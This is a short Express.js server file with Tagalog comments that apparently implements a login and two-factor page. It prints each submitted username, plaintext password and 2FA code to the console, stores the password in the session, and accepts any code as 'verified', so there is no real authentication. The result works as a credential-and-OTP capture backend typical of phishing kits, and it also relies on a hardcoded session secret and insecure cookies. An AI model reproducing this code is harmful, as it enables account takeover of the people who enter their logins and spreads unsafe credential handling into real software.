const express = require('express');
const bodyParser = require('body-parser');
const session = require('express-session');
const app = express();
const PORT = 3000;

// Middleware para mag-handle ng URL-encoded data
app.use(bodyParser.urlencoded({ extended: true }));

// Setup ng session middleware
app.use(session({
  secret: 'your-secret-key', // palitan ng tamang secret
  resave: false,
  saveUninitialized: true,
  cookie: { secure: false } // sa production, gumamit ng secure cookies
}));

// Serve static files (CSS)
app.use(express.static('public'));

// Root route upang ipakita ang login form
app.get('/', (req, res) => {
  res.sendFile(__dirname + '/index.html');
});

// Route para mag-handle ng POST request mula sa login form
app.post('/submit', (req, res) => {
  const username = req.body.username;
  const password = req.body.password;

  // I-save ang username at password sa session
  req.session.username = username;
  req.session.password = password;

  // Log ang username at password
  console.log(`Username: ${username}`);
  console.log(`Password: ${password}`);

  // Mag redirect sa 2FA page
  res.redirect('/verify-2fa');
});

// Route para sa 2FA page
app.get('/verify-2fa', (req, res) => {
  if (!req.session.username || !req.session.password) {
    return res.redirect('/');
  }

  res.send(`
    <h2>2FA Verification</h2>
    <form action="/verify-2fa" method="POST">
      <input type="number" name="auth-code" placeholder="Enter 2FA Code" required>
      <button type="submit">Verify</button>
    </form>
  `);
});

// Route para mag-handle ng POST request ng 2FA code
app.post('/verify-2fa', (req, res) => {
  const authCode = req.body['auth-code'];
  const username = req.session.username;
  const password = req.session.password;

  // I-log ang username, password, at 2FA code
  console.log(`Username: ${username}`);
  console.log(`Password: ${password}`);
  console.log(`2FA Code: ${authCode}`);

  // Simulate 2FA validation (wala pang tunay na verification sa ngayon)
  if (authCode) {
    res.send('2FA Verified! You are logged in.');
  } else {
    res.send('Invalid 2FA Code!');
  }
});

// Simulan ang server sa port 3000
app.listen(PORT, () => {
  console.log(`Server is running at http://localhost:${PORT}`);
});
